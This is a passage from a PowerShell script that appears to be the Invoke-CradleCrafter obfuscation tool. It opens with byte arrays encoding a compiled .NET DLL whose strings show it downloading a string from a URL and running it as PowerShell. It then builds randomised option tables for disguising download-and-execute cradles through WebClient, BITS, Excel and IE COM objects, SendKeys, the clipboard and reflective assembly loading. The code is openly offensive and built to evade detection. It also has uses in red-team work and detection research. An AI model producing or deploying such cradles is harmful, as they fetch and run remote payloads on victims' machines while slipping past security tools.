0,73,110,118,111,107,101,0,0,0,0,0,3,32,0,0,0,0,0,114,185,22,168,241,113,241,67,190,63,225,119,46,197,222,85,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,204,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`124,39,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(232,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,64,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,204,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,172,3,0,0,8,0,0,0,35,85,83,0,180,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,196,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,48,0,41,0,6,0,124,0,92,0,6,0,156,0,92,0,10,0,5,1,222,0,10,0,21,1,222,0,10,0,50,1,193,0,14,0,92,1,81,1,6,0,117,1,41,0,6,0,172,1,141,1,10,0,185,1,193,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,55,0,10,0,1,0,157,32,0,0,0,0,134,24,64,0,16,0,3,0,0,0,1,0,70,0,0,0,2,0,74,0,17,0,64,0,20,0,25,0,64,0,16,0,33,0,30,1,34,0,41,0,45,1,16,0,49,0,61,1,39,0,49,0,68,1,44,0,57,0,64,0,16,0,57,0,102,1,50,0,65,0,124,1,55,0,49,0,131,1,62,0,49,0,194,1,68,0,9,0,64,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(186,0,0,0,4)+@(0)*11+@(1,0,32,0,0,0,0,0,3)+@(0)*11+@(25,0,193,0,0,0,0,0,4)+@(0)*11+@(1,0,41)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,85,66,109,120,78,108,110,103,97,122,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,86,81,65,106,85,84,119,74,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,0,0,3,59,0,0,0,0,0,187,97,205,53,76,144,76,76,183,12,177,161,164,250,0,181,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,16,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,64,53)+@(0)*502"))

    # The remaining variables are all variables that are explicitly set based on Invoke-CradleCrafter options.
    # For display purposes we will maintain a tagged and tagless version of every configurable variable (all of the below).
    # To simplify this we track these configurable variables with $OptionsVarArr and set the tagged version of the variable in the next step.
    $OptionsVarArr = @()
    $NewObjectOptions                     = @("New-Object ","$InvocationOperatorRandom($GetCommandRandom $NewObjectWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $NewObjectWildcardRandom)))
    $OptionsVarArr                       +=   "NewObject"
    $NewObjectRandom                      =    Get-Random -Input @($NewObjectOptions[0],$NewObjectOptions[1])
    $SelectObjectOptions                  = @((Get-Random -Input @("Select-Object ","Select ")),"$InvocationOperatorRandom($GetCommandRandom $SelectObjectWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $SelectObjectWildcardRandom)))
    $OptionsVarArr                       +=   "SelectObject"
    $SelectObjectRandom                   =    Get-Random -Input @($SelectObjectOptions[0],$SelectObjectOptions[1])
    $InvokeWebRequestOptions              = @((Get-Random -Input @('Invoke-WebRequest','IWR')),(Get-Random -Input @('WGET','CURL')),"$InvocationOperatorRandom($GetCommandRandom $InvokeWebRequestWildcardRandom)",($InvocationOperatorRandom + (Out-PsGetCmdlet $InvokeWebRequestWildcardRandom)))
    $OptionsVarArr                       +=   "InvokeWebRequest"
    $InvokeRestMethodOptions              = @((Get-Random -Input @('Invoke-RestMethod','IRM')),"$InvocationOperatorRandom($GetCommandRandom $InvokeRestMethodWildcardRandom)",($InvocationOperatorRandom + (Out-PsGetCmdlet $InvokeRestMethodWildcardRandom)))
    $OptionsVarArr                       +=   "InvokeRestMethod"
    $GetItemPropertyOptions               = @((Get-Random -Input @('Get-ItemProperty ','GP ','ItemProperty ')),"$InvocationOperatorRandom($GetCommandRandom $GetItemPropertyWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $GetItemPropertyWildcardRandom)))
    $OptionsVarArr                       +=   "GetItemProperty"
    $SetItemPropertyOptions               = @((Get-Random -Input @('Set-ItemProperty ','SP ')),"$InvocationOperatorRandom($GetCommandRandom $SetItemPropertyWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $SetItemPropertyWildcardRandom)))
    $OptionsVarArr                       +=   "SetItemProperty"
    $DownloadStringOptions                = @("DownloadString","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadStringWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadStringWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadString"
    $DownloadDataOptions                  = @("DownloadData","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadDataWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadDataWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadData"
    $DownloadFileOptions                  = @("DownloadFile","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadFileWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadFileWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadFile"
    $OpenReadOptions                      = @("OpenRead","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenReadWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenReadWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "OpenRead"
    $StreamOptions                        = @(("$SRSetVarTag$NewObjectTag$SystemIOStreamReader($ResponseTag);$ResultSetVarTag" + $ReadToEndRandom.Replace($ReadToEndTag,$SRGetVarTag) + ";$SRGetVarTag.Close()"),$ReadToEndRandom.Replace($ReadToEndTag,"($NewObjectTag$SystemIOStreamReader($NewObjectNetWebClientTag).$OpenReadTag('$UrlTag'))"),$WhileReadByte)
    $OptionsVarArr                       +=   "Stream"
    $LoadWithPartialNameOptions           = @("LoadWithPartialName","($ReflectionAssemblyTag.$GetMethodsGetMembersRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$LoadWithPartialNameWildcardRandom'}|$ForEachRandom{$CurrentItemVariable2.Name}|$SelectObjectRandom $FirstLastFlagRandom 1).Invoke")
    $OptionsVarArr                       +=   "LoadWithPartialName"
    $LoadOptions                          = @("Load","($ReflectionAssemblyTag.$GetMethodsGetMembersRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$LoadWildcardRandom'}|$ForEachRandom{$CurrentItemVariable2.Name}|$SelectObjectRandom $FirstLastFlagRandom 1).Invoke")
    $OptionsVarArr                       +=   "Load"
    $ExecOptions                          = @("Exec","(($WScriptShellTag|$GetMemberRandom)[2].Name).Invoke")
    $OptionsVarArr                       +=   "Exec"
    $AppActivateOptions                   = @("AppActivate","(($WScriptShellTag|$GetMemberRandom)[0].Name).Invoke")
    $OptionsVarArr                       +=   "AppActivate"
    $SendKeysOptions                      = @("SendKeys","(($WScriptShellTag|$GetMemberRandom)[10].Name).Invoke")
    $OptionsVarArr                       +=   "SendKeys"
    $GetTextOptions                       = @("GetText()",("($WindowsFormsClipboardTag.$GetMethodsGetMembersRandom[" + (Get-Random -Input @(15,16)) + "].Name).Invoke()"))
    $OptionsVarArr                       +=   "GetText"
    $Stream2Options                       = @(("$SRSetVarTag$NewObjectRandom$SystemIOStreamReader($ResponseTag);$ResultSetVarTag" + $ReadToEndRandom.Replace($ReadToEndTag,$SRGetVarTag) + ";$SRGetVarTag.Close()"),$ReadToEndRandom.Replace($ReadToEndTag,"($NewObjectRandom$SystemIOStreamReader($NetHttpWebRequestTag::Create('$UrlTag').GetResponse().GetResponseStream()))"),$WhileReadByte)
    $OptionsVarArr                       +=   "Stream2"
    $NavigateOptions                      = @("Navigate","Navigate2",("(($VarTag1|$GetMemberRandom)[" + (Get-Random -Input @(7,8)) + "].Name).Invoke"))
    $OptionsVarArr                       +=   "Navigate"
    $VisibleOptions                       = @("Visible","(($VarTag1|$GetMemberRandom)[45].Name)")
    $OptionsVarArr                       +=   "Visible"
    $Visible2Options                      = @("Visible","(($VarTag1|$GetMemberRandom)[420].Name)")
    $OptionsVarArr                       +=   "Visible2"
    $DisplayAlertsOptions                 = @("DisplayAlerts","(($VarTag1|$GetMemberRandom)[298].Name)")
    $OptionsVarArr                       +=   "DisplayAlerts"
    $WorkbooksOptions                     = @("Workbooks","(($VarTag1|$GetMemberRandom)[464].Name)")
    $OptionsVarArr                       +=   "Workbooks"
    $OpenOptions                          = @("Open","(($VarTag1.$ComMemberTag.PsObject.Members|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenWildcardRandom'}).Name).Invoke")
    $OptionsVarArr                       +=   "Open"        
    $SilentOptions                        = @("Silent","(($VarTag1|$GetMemberRandom)[37].Name)")
    $OptionsVarArr                       +=   "Silent"
    $ContentOptions                       = @("Content","(($VarTag2|$GetMemberRandom)[205].Name)")
    $OptionsVarArr                       +=   "Content"
    $iWindowPosDXOptions                  = @("iWindowPosDX","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[5].Name)")
    $OptionsVarArr                       +=   "iWindowPosDX"
    $iWindowPosDYOptions                  = @("iWindowPosDY","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[6].Name)")
    $OptionsVarArr                       +=   "iWindowPosDY"
    $iWindowPosXOptions                   = @("iWindowPosX","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[7].Name)")
    $OptionsVarArr                       +=   "iWindowPosX"
    $iWindowPosYOptions                   = @("iWindowPosY","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[8].Name)")
    $OptionsVarArr                       +=   "iWindowPosY"
    $StatusBarOptions                     = @("StatusBar","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[14].Name)")
    $OptionsVarArr                       +=   "StatusBar"
    $Content2Options                      = @("$ResponseTag.Content",$StringConversionWithTags,"($ResponseTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2.PsObject.Properties).Name[0])})",("($ResponseTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2|$GetMemberRandom)" + (Get-Random -Input @('[4].Name).Invoke()','[7].Name)')) + "})"))
    $OptionsVarArr                       +=   "Content2"
    $TextOptions                          = @("Text","(($VarTag2.$ContentTag|$GetMemberRandom)[172].Name)")
    $OptionsVarArr                       +=   "Text"
    $BusyOptions                          = @("Busy","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BusyWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BusyWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Busy"
    $DocumentOptions                      = @("Document","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Document"
    $BodyOptions                          = @("Body","(($VarTag1.$DocumentTag.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BodyWildcardRandom'}).Name)","(($VarTag1.$DocumentTag|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BodyWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Body"
    $InnerTextOptions                     = @((Get-Random -Input @('InnerText','OuterText')),"(($VarTag1.$DocumentTag.$BodyTag|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InnerTextWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "InnerText"
    $DocumentsOptions                     = @("Documents","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentsWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentsWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Documents"
    $PropertyFlagOptions                  =    @($PropertyFlagSubString)
    $OptionsVarArr                       +=   "PropertyFlag"
    $ComObjectFlagOptions                 = @("-ComObject",$ComObjectFlagSubString)
    $OptionsVarArr                       +=   "ComObjectFlag"
    $SleepOptions                         = @("Start-Sleep -Seconds 1",("Sleep " + $SleepArguments),("$InvocationOperatorRandom($GetCommandRandom $StartSleepWildcardRandom)" + $SleepArguments),("$InvocationOperatorRandom(" + (Out-PsGetCmdlet $StartSleepWildcardRandom) + ")" + $SleepArguments))
    $OptionsVarArr                       +=   "Sleep"
    $SleepMillisecondsOptions             = @("Start-Sleep -Milliseconds $NotepadSendKeysSleep",("Sleep " + $SleepMillisecondsArguments),("$InvocationOperatorRandom($GetCommandRandom $StartSleepWildcardRandom)" + $SleepMillisecondsArguments),("$InvocationOperatorRandom(" + (Out-PsGetCmdlet $StartSleepWildcardRandom) + ")" + $SleepMillisecondsArguments))
    $OptionsVarArr                       +=   "SleepMilliseconds"
    $RuntimeInteropServicesMarshalOptions = @('[Void][System.Runtime.InteropServices.Marshal]',($Void + (Get-Random -Input @('[System.','[')) + 'Runtime.InteropServices.Marshal]'))
    $OptionsVarArr                       +=   "RuntimeInteropServicesMarshal"
    $NetWebClientOptions                  = @('[System.Net.WebClient]','[Net.WebClient]')
    $OptionsVarArr                       +=   "NetWebClient"
    $NetHttpWebRequestOptions             = @('[System.Net.HttpWebRequest]','[Net.HttpWebRequest]')
    $OptionsVarArr                       +=   "NetHttpWebRequest"
    $ReflectionAssemblyOptions            = @('[Void][System.Reflection.Assembly]',($Void + (Get-Random -Input @('[System.','[')) + 'Reflection.Assembly]'))
    $OptionsVarArr                       +=   "ReflectionAssembly"
    $BooleanTrueOptions                   = @("`$True","1",(Out-GetVariable (Get-Random -Input @('T*ue','T*e','*rue','*ue','Tr*','T*r*e'))))
    $OptionsVarArr                       +=   "BooleanTrue"
    $BooleanFalseOptions                  = @("`$False","0",(Out-GetVariable (Get-Random -Input @('F*se','F*e','*alse','*lse','Fa*','F*a*e','Fal*'))))
    $OptionsVarArr                       +=   "BooleanFalse"
    $ByteOptions                          = @("[Char[]]$ByteTag","$ByteTag|$ForEachRandom{[Char]$CurrentItemVariable2}",((Get-Random -Input @("[System.","[")) + "Text.Encoding]::ASCII.GetString($ByteTag)"),"($ByteTag|$ForEachRandom{$CurrentItemVariable2-As'Char'})")
    $OptionsVarArr                       +=   "Byte"
    $ByteRandom                           =    Get-Random $ByteOptions
    $JoinOptions                          = @("(($JoinTag)-Join'')","(-Join($JoinTag))",("(" + (Get-Random -Input @("[String]","[System.String]")) + "::Join('',($JoinTag)))"))
    $OptionsVarArr                       +=   "Join"
    $JoinRandom                           =    Get-Random $JoinOptions
    $JoinNewlineOptions                   = @("($JoinNewLineTag-Join$NewLineTag)","([String]::Join($NewLineTag,($JoinNewLineTag)))")
    $OptionsVarArr                       +=   "JoinNewline"
    $NewLineOptions                       = @('"`n"','[Char]10',"(10-As'Char')")
    $OptionsVarArr                       +=   "Newline"
    $SheetsOptions                        = @("Sheets","(($VarTag1|$GetMemberRandom)[415].Name)")
    $OptionsVarArr                       +=   "Sheets"
    $ItemOptions                          = @("Item","(($VarTag1.$SheetsTag.PsObject.$MethodsOrMembersRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$ItemWildcardRandom'}).Name).Invoke")
    $OptionsVarArr                       +=   "Item"
    $RangeOptions                         = @("Range","(($VarTag1.$SheetsTag.$ItemTag(1)|$GetMemberRandom)[55].Name).Invoke")
    $OptionsVarArr                       +=   "Range"
    $UsedRangeOptions                     = @("UsedRange","(($VarTag1.$SheetsTag.$ItemTag(1)|$GetMemberRandom)[116].Name)")
    $OptionsVarArr                       +=   "UsedRange"
    $RowsOptions                          = @("Rows","(($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag|$GetMemberRandom)[164].Name)")
    $OptionsVarArr                       +=   "Rows"
    $CountOptions                         = @("Count","(($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag.$RowsTag|$GetMemberRandom)[105].Name)")
    $OptionsVarArr                       +=   "Count"
    $ValueOrFormulaOptions                = @("Value2",(Get-Random -Input @('Formula','FormulaLocal','FormulaR1C1','FormulaR1C1Local')),("((($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag.$RowsTag)|$GetMemberRandom)[" + (Get-Random -Input @('178','119','123','124','125')) + "].Name)"))
    $OptionsVarArr                       +=   "ValueOrFormula"
    $SourceRandomOptions                  = @(Get-Random -Input @('./','.\'))
    $OptionsVarArr                       +=   "SourceRandom"
    $Open2Options                         = @("Open","(($VarTag1|$GetMemberRandom)[4].Name)")
    $OptionsVarArr                       +=   "Open2"
    $SendOptions                          = @("Send","(($VarTag1|$GetMemberRandom)[5].Name)")
    $OptionsVarArr                       +=   "Send"
    $ResponseTextOptions                  = @("ResponseText","(($VarTag1|$GetMemberRandom)[16].Name)")
    $OptionsVarArr                       +=   "ResponseText"
    $AddTypeOptions                       = @("Add-Type ","$InvocationOperatorRandom($GetCommandRandom $AddTypeWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $AddTypeWildcardRandom)))
    $OptionsVarArr                       +=   "AddType"
    $LanguageCSharpOptions                  = @("","-Language CSharp ","$LanguageFlagRandom CSharp ")
    $OptionsVarArr                       +=   "LanguageCSharp"
    $SystemNetOptions                     = @('using System.Net;',' ')
    $OptionsVarArr                       +=   "SystemNet"
    $AutomationOptions                    = @('using System.Management.Automation;',' ')
    $OptionsVarArr                       +=   "Automation"
    $AutomationRunspacesOptions           = @('using System.Management.Automation.Runspaces;',' ')
    $OptionsVarArr                       +=   "AutomationRunspaces"
    $ClassAndMethodOptions                = @(@('Class','Method'),$LegitSoundingClassAndMethodInline,$Random2ElementArray)
    $OptionsVarArr                       +=   "ClassAndMethod"
    $StartBitsTransferOptions             = @("Start-BitsTransfer ","`$NULL=$GetHelpRandom($GetCommandRandom $StartBitsTransferWildcardRandom);$InvocationOperatorRandom($GetCommandRandom $StartBitsTransferWildcardRandom)")
    $OptionsVarArr                       +=   "StartBitsTransfer"
    $SourceFlagOptions                    = @("","-Source ","$SourceFlagRandom ")
    $OptionsVarArr                       +=   "SourceFlag"
    $DestinationFlagOptions               = @("","-Destination ","$DestinationFlagRandom ")
    $OptionsVarArr                       +=   "DestinationFlag"
    $DownloadFlagOptions                  = @("/Download",$DownloadFlagSubString,"/",$DownloadFlagDecoyRandom,$DownloadFlagRandomString)
    $OptionsVarArr                       +=   "DownloadFlag"

    # Set default options value for Rearrange, Url, Path and Command inputs (they will be handled in later blocks or functions).
    $RearrangeOptions = @(1,2,3,4,5,6,7,8,9)
    $OptionsVarArr   += "Rearrange"
    $UrlOptions       = @()
    $UrlOptions      += $Url
    $OptionsVarArr   += "Url"
    $PathOptions      = @()
    $PathOptions     += $Path
    $OptionsVarArr   += "Path"
    $CommandOptions   = @()

    # Handle converting $Command input into the $CommandOptions value which is handled differently depending on the invocation type that is selected.
    If($Command.Length -gt 0)
    {
        $CommandOptions += $Command
    }
    Else
    {
